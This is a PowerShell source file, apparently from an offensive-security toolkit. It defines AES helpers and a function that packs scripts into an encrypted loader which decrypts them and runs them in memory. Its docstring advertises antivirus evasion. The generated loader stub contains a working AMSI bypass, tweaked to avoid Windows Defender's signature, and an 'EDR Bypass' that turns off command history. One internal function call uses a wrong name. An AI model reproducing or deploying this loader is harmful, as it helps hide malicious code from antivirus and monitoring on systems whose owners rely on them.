function Get-AESEncrypt
{
<#
.SYNOPSIS

Get-AESEncrypt encrypts a message using AES-256 and returns the result as a custom psobject.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Get-AESEncrypt encrypts a message using AES-256. Only strings are supported for encryption.

.PARAMETER Message

A string containing the secret message.

.PARAMETER Password

The password used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.PARAMETER Salt

The salt used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.EXAMPLE

Get-AESEncrypt -Message "Hello World" -Password "P@ssw0rd" -Salt "NotAGoodPassword"

Description
-----------

Encrypts the message "Hello World" and returns the result as a custom psobject with the properties "IV" and "Ciphertext".

.NOTES

.LINK

https://github.com/cfalta/ADT

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Message,

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Salt
    )

#Create a new instance of the .NET AES provider
$AES = [System.Security.Cryptography.Aes]::Create()

#Derive an encryption key from the password and the salt
$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)

#The AES instance automatically creates an IV. This is stored in a separate variable for later use.
$IV = $AES.IV

#Set the parameters for AES encryption
$AES.Padding = "PKCS7"
$AES.KeySize = 256
$AES.Key = $Key.GetBytes(32)

#Create a new encryptor
$AESCryptor = $AES.CreateEncryptor()

#Create a memory and crypto stream for encryption
$MemoryStream = New-Object System.IO.MemoryStream
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESCryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)

#Conver the message to a byte array
$MessageBytes = [System.Text.Encoding]::ASCII.GetBytes($Message)

#Encrypt the message using cryptostream
$CryptoStream.Write($MessageBytes,0,$MessageBytes.Length)
$CryptoStream.FlushFinalBlock()

#Get the ciphertext as byte array
$CipherText = $MemoryStream.ToArray()

#Free ressources
$CryptoStream.Close()
$MemoryStream.Close()
$AES.Clear()

#Create a custom psobject containing the initialization vector and the ciphertext
$CryptoResult = New-Object -TypeName PSObject
$CryptoResult | Add-Member -MemberType NoteProperty -Name "IV" -Value ([Convert]::ToBase64String($IV))
$CryptoResult | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value ([Convert]::ToBase64String($CipherText))

return($CryptoResult)

}

function Get-AESDecrypt
{
<#
.SYNOPSIS

Get-AESDecrypt decrypts a ciphertext, which has been previously encrypted using Get-AESEncrypt.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Get-AESDecrypt decrypts a ciphertext, which has been previously encrypted using Get-AESEncrypt.

.PARAMETER Ciphertext

A Base64 encoded version of the encrypted string.

.PARAMETER Password

The password used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.PARAMETER Salt

The salt used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.PARAMETER InitVector

A Base64 encoded version of the initialization vector used for encryption.

.EXAMPLE

Get-AESDecrypt -Ciphertext "3cQGQ9LswBksYanx29dm08fWZGeSFNYvxHpCek0tT4vbOsySFRWrtpLWXJpsoXpEtWK61okUj38lUJ3rQhYWKw==" -Password "P@ssw0rd" -Salt "NotAGoodPassword" -InitVector "nrTD/qzA8uXqXFbsCzIu4w=="

Description
-----------

Decrypts the base64 encoded string and prints the result to stdout.

.NOTES

.LINK

https://github.com/cfalta/ADT

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $CipherText,

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Salt,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $InitVector
    )


#Base64 decode the input
[byte[]]$CipherText = [Convert]::FromBase64String($CipherText)
[byte[]]$InitVector = [Convert]::FromBase64String($InitVector)

#Create a new instance of the .NET AES provider
$AES = [System.Security.Cryptography.Aes]::Create()

#Derive an encryption key from the password and the salt
$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)

#Set the parameters for AES decryption
$AES.Padding = "PKCS7"
$AES.KeySize = 256
$AES.Key = $Key.GetBytes(32)
$AES.IV = $InitVector

#Create a decryptor
$AESDecryptor = $AES.CreateDecryptor()

#Set up streams for decryption
$MemoryStream = New-Object System.IO.MemoryStream($CipherText,$True)
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
$StreamReader = New-Object System.IO.StreamReader($CryptoStream)

#Get the decrypted message
$Message = $StreamReader.ReadToEnd()

$CryptoStream.Close()
$MemoryStream.Close()
$AES.Clear()

return($Message)

}

function New-EncryptedScriptLoader
{
<#
.SYNOPSIS

New-EncryptedScriptLoader unites multiple powershell script files or a whole script module into a single, encrypted loader function. This function can then be executed easily by running something like this: "Get-Content -raw .\encryptedloader.ps1 | Invoke-Expression"

Author: Christoph Falta (@cfalta)

.DESCRIPTION

New-EncryptedScriptLoader unites multiple powershell script files or a whole script module into a single, encrypted loader function. This function can then be executed easily by running something like this: "Get-Content -raw .\encryptedloader.ps1 | Invoke-Expression"

This offers multiple benefits:

-) It is possible to put various scripts from different modules in a single, encrypted file. Therefore it is no longer necessary to handle powershell modules.
-) All scripts can be dynamicyll unwrapped in memory with a single command "Get-Content -raw .\encryptedloader.ps1 | Invoke-Expression"
-) All scripts are encrypted using AES 256 Bit encryption. This offers AV evasion as well as confidentiality. (Please note, that you have to use "-OmitPassword" to remove the cleartext encryption key from the script file)

.PARAMETER Path

The path to the file(s) that should be included in the encrypted loader. If the path is a folder, the script automatically includes all ".ps1" files in all subfolders. If the path is a file, only this file is included.

.PARAMETER Password

The password used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.PARAMETER Salt

The salt used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.PARAMETER OutputFile

The path to the output file. Default is ".\CryptLoader.ps1"

.PARAMETER OmitPassword

If set, do not include cleartext password and salt in the outputfile. Use this if you need confidentiality.

.EXAMPLE

New-EncryptedScriptLoader -Path .\PathToAPowershellModule -Password "P@ssw0rd" -Salt "NotAGoodPassword"

Description
-----------

This will search all ".ps1" files in .\PathToAPowershellModule and include them in the new loader file. The scripts will be encrypted using "P@ssw0rd"/"NotAGoodPassword" and the loader will be stored at the default location ".\CryptLoader.ps1".

.NOTES

.LINK

https://github.com/cfalta/ADT

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({Test-Path $_})]
        [String]
        $Path,

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Salt,

        [Parameter(Position = 3, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $OutputFile = (Join-Path (Get-Location) "CryptLoader.ps1"),

        [Parameter(Position = 4, Mandatory = $False)]
        [Switch]
        $OmitPassword
    )


function Write-LoaderFile($EncryptedScriptFileObjects)
{

#This is the decryption stub used in the loader file
$DecryptionStub=@"
if(`$Password -and `$Salt)
{

#EDR Bypass
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)

foreach(`$ef in `$EncryptedFunctions)
{

[byte[]]`$CipherText = [Convert]::FromBase64String(`$ef[1])
[byte[]]`$InitVector = [Convert]::FromBase64String(`$ef[0])

`$AES = [System.Security.Cryptography.Aes]::Create()

`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes(`$Password),[Text.Encoding]::ASCII.GetBytes(`$Salt),"SHA256",5)

`$AES.Padding = "PKCS7"
`$AES.KeySize = 256
`$AES.Key = `$Key.GetBytes(32)
`$AES.IV = `$InitVector

`$AESDecryptor = `$AES.CreateDecryptor()

`$MemoryStream = New-Object System.IO.MemoryStream(`$CipherText,`$True)
`$CryptoStream = New-Object System.Security.Cryptography.CryptoStream(`$MemoryStream,`$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
`$StreamReader = New-Object System.IO.StreamReader(`$CryptoStream)

`$Message = `$StreamReader.ReadToEnd()

`$CryptoStream.Close()
`$MemoryStream.Close()
`$AES.Clear()

`$Message | Invoke-Expression

}
}
"@
    
    #Delete the outputfile if it exists

    if((Test-Path -LiteralPath $OutputFile))
    {
        Remove-Item -LiteralPath $OutputFile -Force
    }

    #Creates a string array of encrypted scripts, which will be included in the decryption stub defined above
    $SummaryArrayDefinition = '$EncryptedFunctions = @('

    foreach($EncScript in $EncryptedScriptFileObjects)
    {
        $SingleArrayDefinition = ($EncScript.ID + ' = (' + '"' + $EncScript.IV + '", "' + $EncScript.Ciphertext + '")')
   
        $SummaryArrayDefinition += ($EncScript.ID + ",")

        Add-Content $OutputFile $SingleArrayDefinition
    }

    $SummaryArrayDefinition = $SummaryArrayDefinition.TrimEnd(",")
    $SummaryArrayDefinition += ")"

    #Write the string array into the loader file
    Add-Content $OutputFile $SummaryArrayDefinition

    #Check if the "OmitPassword" switch has been set and either included the cleartext password in the script or insert a placeholder
    if($OmitPassword)
    {
        $PasswordInFile = "<INSERT-PASSWORD-HERE>"
        $SaltInFile = "<INSERT-SALT-HERE>"
    }
    else
    {
        $PasswordInFile = $Password
        $SaltInFile = $Salt
    }

    $PasswordDefiniton = ('$Password="' + $PasswordInFile + '"')
    $SaltDefiniton = ('$Salt="' + $SaltInFile + '"')

    #Write password, salt and decryption stub to the loader file
    Add-Content $OutputFile $PasswordDefiniton
    Add-Content $OutputFile $SaltDefiniton
    Add-Content $OutputFile $DecryptionStub

}

function Get-EncryptedScriptCode($ScriptFiles)
{
    #Encrypts a collection of files with AES and returns an array containing the Base64-encoded output and IV
    $EncryptedScriptFileObjects = @()
    $Identifier = 1

    foreach($Script in $ScriptFiles)
    {
        $Cleartext = Get-Content -raw -Path $Script.FullName
        
        $Crypt = AESEncrypt -Message $Cleartext -Password $Password -Salt $Salt

        $EncryptedScriptFileObject = New-Object -TypeName PSObject
        $EncryptedScriptFileObject | Add-Member -MemberType NoteProperty -Name "ID" -Value ('$EncFunc' + $Identifier)
        $EncryptedScriptFileObject | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value $Crypt.Ciphertext
        $EncryptedScriptFileObject | Add-Member -MemberType NoteProperty -Name "IV" -Value $Crypt.IV

        $EncryptedScriptFileObjects += $EncryptedScriptFileObject

        $Identifier++
    }

    return($EncryptedScriptFileObjects)
    
}

#Check if the user supplied the path to a file or directory. If the path to a directory was supplied, recursivly retrieve all ".ps1"-files and include them in the encryption.
$FileOrDirectory = Get-Item -Path $Path

if((($FileOrDirectory.GetType()).Name) -eq "FileInfo")
{
    $ScriptFileObjects = $FileOrDirectory  
}   
if((($FileOrDirectory.GetType()).Name) -eq "DirectoryInfo")
{
    $ScriptFileObjects = Get-ChildItem -Filter *.ps1 -Recurse -Path $Path | Where {-Not $_.PSIsContainer}
}

if($ScriptFileObjects)
{
    #Encrypt all files included above
    $EncryptedScripts = Get-EncryptedScriptCode($ScriptFileObjects)

    #Write the encrypted scripts and a loader stub into a file
    Write-LoaderFile($EncryptedScripts)
}

}

